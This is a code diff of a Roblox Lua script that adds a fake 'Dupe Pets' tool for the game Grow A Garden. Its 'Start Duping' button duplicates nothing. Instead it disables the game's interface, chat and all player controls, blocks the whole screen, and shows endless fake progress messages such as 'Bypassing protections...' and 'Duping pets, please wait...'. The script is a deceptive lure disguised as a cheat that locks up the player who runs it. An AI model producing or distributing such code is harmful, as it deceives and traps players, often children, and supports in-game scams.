@@ -4,79 +4,152 @@ local PlayerGui = Player:WaitForChild("PlayerGui")
 local StarterGui = game:GetService("StarterGui")
 local ContextActionService = game:GetService("ContextActionService")
 local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
 
--- Completely disable Roblox core UI and controls
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-ContextActionService:BindActionAtPriority("DisableControls", function() return Enum.ContextActionResult.Sink end, false, 99999999, unpack(Enum.PlayerActions:GetEnumItems()))
-pcall(function() StarterGui:SetCore("ChatActive", false) end)
+-- RGB Glow effect function
+local function createGlow(parent)
+    local glow = Instance.new("UIStroke", parent)
+    glow.Thickness = 2
+    glow.Transparency = 0.2
+    glow.Color = Color3.fromRGB(255, 0, 0)
+    
+    local hue = 0
+    RunService.RenderStepped:Connect(function()
+        hue = (hue + 0.002) % 1
+        glow.Color = Color3.fromHSV(hue, 1, 1)
+    end)
+end
 
--- ScreenGui
+-- Main GUI container
 local MainGui = Instance.new("ScreenGui", PlayerGui)
 MainGui.IgnoreGuiInset = true
 MainGui.ResetOnSpawn = false
-MainGui.DisplayOrder = 999999
+MainGui.DisplayOrder = 100
 
--- Fullscreen hard blocker (highest ZIndex)
-local HardBlocker = Instance.new("TextButton", MainGui)
-HardBlocker.Size = UDim2.new(1, 0, 1, 0)
-HardBlocker.Position = UDim2.new(0, 0, 0, 0)
-HardBlocker.BackgroundTransparency = 1
-HardBlocker.Text = ""
-HardBlocker.ZIndex = 999999
-HardBlocker.AutoButtonColor = false
+-- Draggable aesthetic box
+local BoxFrame = Instance.new("Frame", MainGui)
+BoxFrame.Size = UDim2.new(0, 300, 0, 150)
+BoxFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
+BoxFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+BoxFrame.BorderSizePixel = 0
+Instance.new("UICorner", BoxFrame).CornerRadius = UDim.new(0, 20)
+createGlow(BoxFrame)
 
--- Background frame (minimal gray)
-local Background = Instance.new("Frame", MainGui)
-Background.Size = UDim2.new(1, 0, 1, 0)
-Background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+BoxFrame.Active = true
+BoxFrame.Draggable = true
 
--- Title
-local Title = Instance.new("TextLabel", Background)
-Title.Text = "Grow A Garden"
+-- Smooth opening animation
+BoxFrame.Size = UDim2.new(0, 0, 0, 0)
+BoxFrame:TweenSize(UDim2.new(0, 300, 0, 150), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.4, true)
+
+-- Title label
+local Title = Instance.new("TextLabel", BoxFrame)
+Title.Text = "Dupe Pets"
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 45
+Title.TextSize = 32
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.BackgroundTransparency = 1
-Title.Size = UDim2.new(1, 0, 0.1, 0)
-Title.Position = UDim2.new(0, 0, 0.15, 0)
+Title.Size = UDim2.new(1, 0, 0.4, 0)
+Title.Position = UDim2.new(0, 0, 0, 0)
 
--- Progress bar background
-local ProgressBarBackground = Instance.new("Frame", Background)
-ProgressBarBackground.Size = UDim2.new(0.6, 0, 0.04, 0)
-ProgressBarBackground.Position = UDim2.new(0.2, 0, 0.5, 0)
-ProgressBarBackground.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-ProgressBarBackground.BorderSizePixel = 0
-Instance.new("UICorner", ProgressBarBackground).CornerRadius = UDim.new(0, 20)
+-- Dupe button
+local DupeButton = Instance.new("TextButton", BoxFrame)
+DupeButton.Text = "Start Duping"
+DupeButton.Font = Enum.Font.Gotham
+DupeButton.TextSize = 24
+DupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+DupeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+DupeButton.Size = UDim2.new(0.8, 0, 0.35, 0)
+DupeButton.Position = UDim2.new(0.1, 0, 0.55, 0)
+Instance.new("UICorner", DupeButton).CornerRadius = UDim.new(0, 12)
+createGlow(DupeButton)
 
--- Progress bar foreground (white)
-local ProgressBar = Instance.new("Frame", ProgressBarBackground)
-ProgressBar.Size = UDim2.new(0, 0, 1, 0)
-ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ProgressBar.BorderSizePixel = 0
-Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(0, 20)
+-- Function to run hard lock loading screen
+local function runLoadingScreen()
 
--- Status text
-local StatusText = Instance.new("TextLabel", Background)
-StatusText.Text = "Starting..."
-StatusText.Font = Enum.Font.Gotham
-StatusText.TextSize = 25
-StatusText.TextColor3 = Color3.new(1, 1, 1)
-StatusText.BackgroundTransparency = 1
-StatusText.Size = UDim2.new(1, 0, 0.1, 0)
-StatusText.Position = UDim2.new(0, 0, 0.58, 0)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    ContextActionService:BindActionAtPriority("DisableControls", function() return Enum.ContextActionResult.Sink end, false, 99999999, unpack(Enum.PlayerActions:GetEnumItems()))
+    pcall(function() StarterGui:SetCore("ChatActive", false) end)
 
--- Smooth loading
-task.spawn(function()
-    for i = 1, 100 do
-        ProgressBar:TweenSize(UDim2.new(i/100, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.03, true)
-        if i == 10 then
-            StatusText.Text = "Connecting to server..."
-        elseif i == 50 then
-            StatusText.Text = "Bypassing protections..."
-        elseif i == 90 then
-            StatusText.Text = "Finalizing..."
+    MainGui:Destroy()
+
+    local LockGui = Instance.new("ScreenGui", PlayerGui)
+    LockGui.IgnoreGuiInset = true
+    LockGui.ResetOnSpawn = false
+    LockGui.DisplayOrder = 999999
+
+    local HardBlocker = Instance.new("TextButton", LockGui)
+    HardBlocker.Size = UDim2.new(1, 0, 1, 0)
+    HardBlocker.BackgroundTransparency = 1
+    HardBlocker.Text = ""
+    HardBlocker.ZIndex = 999999
+    HardBlocker.AutoButtonColor = false
+
+    local Background = Instance.new("Frame", LockGui)
+    Background.Size = UDim2.new(1, 0, 1, 0)
+    Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+
+    local LoadTitle = Instance.new("TextLabel", Background)
+    LoadTitle.Text = "Grow A Garden"
+    LoadTitle.Font = Enum.Font.GothamBold
+    LoadTitle.TextSize = 45
+    LoadTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    LoadTitle.BackgroundTransparency = 1
+    LoadTitle.Size = UDim2.new(1, 0, 0.1, 0)
+    LoadTitle.Position = UDim2.new(0, 0, 0.15, 0)
+
+    local ProgressBarBackground = Instance.new("Frame", Background)
+    ProgressBarBackground.Size = UDim2.new(0.6, 0, 0.04, 0)
+    ProgressBarBackground.Position = UDim2.new(0.2, 0, 0.5, 0)
+    ProgressBarBackground.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+    ProgressBarBackground.BorderSizePixel = 0
+    Instance.new("UICorner", ProgressBarBackground).CornerRadius = UDim.new(0, 20)
+
+    local ProgressBar = Instance.new("Frame", ProgressBarBackground)
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+    ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    ProgressBar.BorderSizePixel = 0
+    Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(0, 20)
+
+    local StatusText = Instance.new("TextLabel", Background)
+    StatusText.Text = "Starting..."
+    StatusText.Font = Enum.Font.Gotham
+    StatusText.TextSize = 25
+    StatusText.TextColor3 = Color3.new(1, 1, 1)
+    StatusText.BackgroundTransparency = 1
+    StatusText.Size = UDim2.new(1, 0, 0.1, 0)
+    StatusText.Position = UDim2.new(0, 0, 0.58, 0)
+
+    task.spawn(function()
+        for i = 1, 100 do
+            ProgressBar:TweenSize(UDim2.new(i/100, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.05, true)
+            if i == 10 then
+                StatusText.Text = "Connecting to server..."
+            elseif i == 50 then
+                StatusText.Text = "Bypassing protections..."
+            elseif i == 90 then
+                StatusText.Text = "Finalizing..."
+            end
+            task.wait(0.1)
         end
-        task.wait(0.06)
-    end
-    StatusText.Text = "Loaded Successfully!"
-end)
+        StatusText.Text = "Loaded Successfully!"
+        task.wait(1.5)
+        
+        -- Continuous random messages after loading
+        local messages = {
+            "Joining servers...",
+            "Duping pets, please wait...",
+            "Stabilizing duplication process...",
+            "Please be patient...",
+            "Validating packets...",
+            "Synchronizing servers...",
+            "Fetching inventory data..."
+        }
+        while true do
+            StatusText.Text = messages[math.random(1, #messages)]
+            task.wait(3)
+        end
+    end)
+end
+
+DupeButton.MouseButton1Click:Connect(runLoadingScreen)
